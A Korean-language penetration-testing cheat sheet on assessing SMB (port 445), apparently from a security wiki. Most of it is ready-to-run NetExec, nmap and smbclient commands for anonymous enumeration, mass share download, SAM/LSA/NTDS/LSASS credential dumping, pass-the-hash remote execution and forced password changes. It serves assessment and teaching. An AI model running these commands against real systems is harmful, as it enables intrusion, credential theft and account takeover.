---
sidebar_position: 6
title: SMB (Port 445)
---

# SMB (Port 445) 취약점 진단

## Overview

**SMB (Server Message Block)**: 파일, 프린터 공유 및 원격 명령 실행을 위한 프로토콜

**주요 포트**:
- **445/TCP**: SMB over TCP (최신)
- **139/TCP**: SMB over NetBIOS (레거시)

---

## Assessment Checklist

- [ ] **Null Session (익명 접속)**: 계정 정보 없이(Null) IPC$ 및 기타 공유 폴더 접근 가능 여부 점검
- [ ] **공유 폴더 권한**: 파일 읽기(정보 유출) 및 쓰기(악성 파일 업로드) 권한 확인
- [ ] **알려진 취약점(1-day) 존재 여부**: MS08-067, MS17-010(EternalBlue), SMBGhost 등 원격 코드 실행 취약점 점검
- [ ] **보안 설정 결함**: SMBv1 활성화 여부 및 SMB Signing 비활성화(중간자 공격 가능) 여부 점검

---

## 1. Reconnaissance

### 서비스 및 버전 스캔
```bash
# 기본 버전 스캔 및 OS Discovery 스크립트 실행
nmap -p 139,445 -sV -sC <target>
nmap -p 445 --script smb-os-discovery <target>

# [레거시] Enum4linux를 이용한 전체 정보(OS, 도메인, 사용자, 그룹) 열거
enum4linux -a <target>
```

### NetExec을 이용한 기본 시스템 열거 (권장)
```bash
# 기본 접속 및 Null Session 테스트
nxc smb <target> -u '' -p ''

# 사용자 및 로컬 그룹 열거
nxc smb <target> -u '<user>' -p '<pass>' --users
nxc smb <target> -u '<user>' -p '<pass>' --groups

# 디스크 정보 및 로그온 사용자 확인
nxc smb <target> -u '<user>' -p '<pass>' --disks
nxc smb <target> -u '<user>' -p '<pass>' --loggedon-users

# RID 브루트포스 (사용자 목록 추출)
nxc smb <target> -u '' -p '' --rid-brute
```

---

## 2. Exploitation

### 공유 폴더(Share) 열거 및 탐색
```bash
# [NetExec] 익명 접속으로 공유 폴더 목록 및 디렉토리 열거
nxc smb <target> -u '' -p '' --shares
nxc smb <target> -u '<user>' -p '<pass>' --shares --dir "<folder>"

# [smbclient] 공유 폴더 목록 조회 및 인증 접속
smbclient -L //<target> -N
smbclient //<target>/<share> -U <user>

# [smbmap] 공유 목록 및 권한(Read/Write) 동시 확인
smbmap -H <target> -u '' -p ''
```

### 공유 폴더 마운트 및 파일 처리
```bash
# 1. 로컬에 CIFS 마운트 포인트 생성 및 마운트 (인증 또는 Guest)
sudo mkdir -p /mnt/smb
sudo mount -t cifs //<target>/<share> /mnt/smb -o username=<user>,password=<pass>
sudo mount -t cifs //<target>/<share> /mnt/smb -o guest

# 2. [대안] NetExec을 활용한 파일 다운로드/업로드
nxc smb <target> -u '<user>' -p '<pass>' --get-file \\path\\file.txt local_file.txt
nxc smb <target> -u '<user>' -p '<pass>' --put-file local_file.txt \\path\\file.txt

# 3. [대안] smbclient 쉘 내부에서 다중 파일 다운로드
smb> mask ""
smb> recurse ON
smb> prompt OFF
smb> mget *
```

### SMB 주요 취약점(RCE) 스캔
```bash
# [Nmap] 전체 SMB 관련 취약점 스크립트 실행
nmap -p 445 --script "smb-vuln-*" <target>

# [NetExec] 특정 크리티컬 취약점 검증
nxc smb <target> -u '' -p '' -M ms17-010       # EternalBlue
nxc smb <target> -u '' -p '' -M smbghost       # SMBGhost
nxc smb <target> -u '' -p '' -M zerologon      # ZeroLogon
nxc smb <target> -u '' -p '' -M printnightmare # PrintNightmare
```

### 자격증명 덤프 (Credential Dumping)
관리자 권한 획득 후 NetExec을 활용해 타겟 시스템의 크리덴셜 덤프
```bash
nxc smb <target> -u '<admin>' -p '<pass>' --sam    # SAM 해시 덤프
nxc smb <target> -u '<admin>' -p '<pass>' --lsa    # LSA 비밀번호 추출
nxc smb <target> -u '<admin>' -p '<pass>' --ntds   # 도메인 컨트롤러 NTDS.dit 덤프
nxc smb <target> -u '<admin>' -p '<pass>' -M lsassy # LSASS 메모리 덤프 (명령어/모듈)
```

### 원격 명령 실행 (RCE)
```bash
# [NetExec] 비밀번호 또는 해시(Pass-The-Hash)를 활용한 OS 명령어 실행
nxc smb <target> -u '<admin>' -H '<NTLM_HASH>' -x "whoami"

# Process Injection 방식 명령어 실행
nxc smb <target> -u '<admin>' -M pi -o PID=<PID> EXEC=<COMMAND>
```

---

## 3. Advanced Techniques

### Spider Plus 모듈을 활용한 대규모 파일 추출
NetExec의 Spider Plus 모듈을 활용하여 접근 가능한 모든 공유의 파일을 자동화하여 분석/다운로드
```bash
# 전체 파일 목록 수집 및 확인
nxc smb <target> -u '<user>' -p '<pass>' --shares -M spider_plus

# 자동 다운로드 활성화 및 크기 제한 설정
nxc smb <target> -u '<user>' -p '<pass>' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
```

### 일반적인 Windows Share 네이밍 규칙
공유 이름에 따른 용도 파악으로 공격 효율성 증대
- `ADMIN$`: 원격 관리용 (C:\Windows, 관리자 전용)
- `C$`, `D$`: 드라이브 루트 (관리자 전용)
- `IPC$`: 프로세스 간 통신 (보통 익명 Null Session 허용)
- `print$`: 프린터 드라이버
- 숨김 폴더: 끝에 `$` 기호가 붙어 있음

---

## 4. Post-Exploitation

### 사용자 비밀번호 변경 및 계정 제어
장악한 권한을 통해 기존 사용자 비밀번호 변경 혹은 악성 계정 생성
```bash
# 자신의 비밀번호 변경
nxc smb <target> -u '<user>' -p '<pass>' -M change-password -o NEWPASS=<new_pass>

# [관리자 권한] 타 사용자 비밀번호 강제 변경
nxc smb <target> -u '<admin>' -p '<pass>' -M change-password -o USER=<target_user> NEWPASS=<new_pass>
```
